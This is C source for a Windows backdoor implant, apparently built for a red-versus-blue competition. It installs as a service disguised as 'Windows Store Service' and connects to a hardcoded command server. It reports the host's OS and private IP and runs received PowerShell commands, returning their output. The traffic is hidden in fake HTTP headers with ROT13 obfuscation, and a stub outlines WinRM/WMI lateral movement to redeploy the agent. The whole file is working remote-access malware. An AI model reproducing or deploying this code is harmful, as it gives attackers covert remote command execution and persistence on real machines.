#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#include <ws2tcpip.h>
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "wbemuuid.lib")
#define _CRT_SECURE_NO_WARNINGS

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(DWORD argc, LPTSTR* argv);
void ControlHandler(DWORD request);

static void encrypt(char* plainText) {
    // This function takes a pointer to a string, and rotates the characters by 13
    // Because the Ceaser Cipher we are using is 13 characters, the same cipher can be applied
    // To do both encryption and decryption

    // Build the encrypted String by iterating through each character, and rotating it.
    char* newString = (char*)calloc(1024, sizeof(char));
    for (int i = 0; i < strnlen(plainText, 1024); i++) {
        if ((plainText[i] >= 'a' && plainText[i] <= 'z')) {
            newString[i] = ((plainText[i] - 'a' + 13) % 26) + 'a';
        }
        else if ((plainText[i] >= 'A' && plainText[i] <= 'Z')) {
            newString[i] = ((plainText[i] - 'A' + 13) % 26) + 'A';
        }
        else {
            newString[i] = plainText[i];
        }
    }

    // Replace the the plain text with the cipher text
    strcpy_s(plainText, 1024, newString);

    // Free teh memory allocated to newString
    free(newString);
}

unsigned __stdcall winrmOtherClients(){
    // TODO params, pointer to struct that contains ips, usernames and passwords
    // TODO figure out how to make sure that only one thread has access to the struct at a time
    // This function will attempt to connect to other clients via WinRM. It will check if the clinet has an active connection to the C2.
    // If it doesn't, it will redownload the agent

    // result of attempting to make WinRM connection
    HRESULT hres;

    // Initialize COM.
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        printf("Failed to initialize COM library. Error code = 0x%x", hres);
        return 1;  // Program has failed.
    }

    // Set general COM security levels.
    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
    );

    if (FAILED(hres)) {
        printf("Failed to initialize security. Error code = 0x%x", hres);
        CoUninitialize();
    }

    // Obtain the initial locator to WMI.
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres)) {
        printf("Failed to create IWbemLocator object. Error code = 0x%x", hres);
        CoUninitialize();
        return 1;  // Program has failed.
    }

    // TODO
    // While(true){
    //      sleep(some time)
    //      for client in clients{
    //           wmi commands to make sure that this machine has an agent running
    // Connect to the WMI namespace.
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"), // WMI namespace
        NULL,                    // User name
        NULL,                    // User password
        0,                       // Locale
        NULL,                    // Security flags
        0,                       // Authority 
        0,                       // Context object 
        &pSvc                    // IWbemServices proxy
    );

    if (FAILED(hres)) {
        printf("Could not connect. Error code = 0x%x", hres);
        pLoc->Release();
        CoUninitialize();
        return 1;  // Program has failed.
    }

    printf("Connected to ROOT\\CIMV2 WMI namespace\n");

    // Perform necessary operations (e.g., executing a command)...
    // Make multiple WMI requests using pSvc. 
    // Example:
    // HRESULT queryResult = pSvc->ExecQuery(...);
    // 
    // Cleanup
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
}

unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
    SOCKET clientConnection = *clientSocket;
    // Every 30 seconds, send a KEEP_ALIVE message to the server, to keep the socket open
    while (1) {
        char keepAlive[1024] = "KEEP_ALIVE\n";
        char message[1200] = "HTTP/1.1 200 OK\r\nContent-Length: 11\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
        encrypt(keepAlive);
        strncat_s(message, keepAlive, 12);
        Sleep(30000);
        send(clientConnection, keepAlive, strnlen(keepAlive, 11), 0);
    }
}

int main(void) {
    // Connect main thread to the service control messanger
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)TEXT("Windows Store Service"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("Failed to Start Service\n");
    }

    return 0;
}

void ServiceMain(DWORD argc, LPTSTR* argv) {
    hStatus = RegisterServiceCtrlHandler(TEXT("MyService"), (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        // Handle error
        return;
    }

    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    // Report initial status to SCM
    SetServiceStatus(hStatus, &ServiceStatus);

    // Service initialization code here

    // Report running status when initialization is complete
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    /////////////////////////////////////
    //   START OF NON-SERVICE CODE     //
    /////////////////////////////////////

    // Initialize the Socket, and server address variables
    WSADATA sockData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));

    WSAStartup(MAKEWORD(2, 2), &sockData);

    char serverMessage[1024];
    for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Error creating socket");
        exit(-1);
    }

    // Set up server address and port
    const char* serverIPAddress = "10.0.10.128";
    wchar_t wideServerIPAddress[16];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
    serverAddr.sin_family = AF_INET;
    InetPton(AF_INET, wideServerIPAddress, &serverAddr.sin_addr.s_addr);
    serverAddr.sin_port = htons(80);

    // Connect to server
    int result = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result != 0) {
        int error = WSAGetLastError();
        printf("Error Code: %d\n", error);
        exit(error);
    }

    // The first message sent to the Server is the OS
    const char* osMessage = "Windows\n";
    send(clientSocket, osMessage, strnlen(osMessage, 8), 0);

    // The second message sent to the Server is the host address.
    // The host address is needed, as in a traditional red vs blue competition, most of the 
    // Infrastructure is sitting behind NAT, while the Proxy server is publicly acessible.
    // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
    // Private IP address that is unique for that competition
    char host[256];
    char ipstr[INET_ADDRSTRLEN + 2];
    struct addrinfo hints, * res, * p;
    int status;

    // Get the hostname
    gethostname(host, sizeof(host));

    // Set up the hints structure
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Get address information
    status = getaddrinfo(host, NULL, &hints, &res);

    // Loop through all the results and get the first IPv4 address
    for (p = res; p != NULL; p = p->ai_next) {
        void* addr = NULL;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
            addr = &(ipv4->sin_addr);

            // Convert the IP to a string
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            int len = strnlen(ipstr, 16);
            ipstr[len + 1] = '\0';
            ipstr[len] = '\n';
            send(clientSocket, ipstr, strnlen(ipstr, 17), 0);

            // Break after the first IP address is found
            break;
        }
    }

    // Free the linked list
    freeaddrinfo(res);

    // Start a thread to send a keep alive message every 30 seconds to the Server
    HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);

    // Main service loop
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        // Get message from Server
        int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
        serverMessage[bytesRead] = '\0';

        // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
        // To do this, we just move the pointer past the wherever the substring variable is found
        const char* substring = "charset=utf-8\r\n\r\n";
        char* startOfActualData = strstr(serverMessage, substring);
        startOfActualData += strnlen(substring, 19);
        strcpy_s(serverMessage, sizeof(serverMessage), startOfActualData);

        // Decrypt the Message from the server
        encrypt(serverMessage);
        const char* keepAlive = "KEEP_ALIVE\n";

        // Check to make sure the message isn't a keep alive message
        if (strncmp(serverMessage, keepAlive, 11) != 0) {
            // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
            char command[1100] = "Powershell.exe -Command \"";
            strcat_s(command, rsize_t(1100), serverMessage);
            strcat_s(command, rsize_t(1100), "\"");

            // Create variables to run and store command output
            char commandOutput[8192];
            FILE* pipe;

            // Open the command for reading
            pipe = _popen(command, "r");
            if (pipe == NULL) {
                printf("Error opening pipe.\n");
            }

            // Read the output a line and send it back to the Server
            while (fgets(commandOutput, 8190, pipe) != NULL) {
                // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
                encrypt(commandOutput);
                int len = strnlen(commandOutput, 8190);
                commandOutput[len] = '\n';
                commandOutput[len + 1] = '\0';

                // Disguise the command output in an HTTP Header
                char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
                char messageSize[6];
                sprintf_s(messageSize, "%d", (int)strnlen(commandOutput, 8190));
                strncat_s(message, messageSize, 6);
                char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
                strncat_s(message, endMessage, 46);
                strncat_s(message, commandOutput, 8192);


                send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
            }

            // Close the pipe
            _pclose(pipe);
        }
    }

    // Cleanup and shutdown
    closesocket(clientSocket);
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);

        // Perform cleanup tasks

        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        // Handle shutdown tasks
        break;

    default:
        break;
    }
}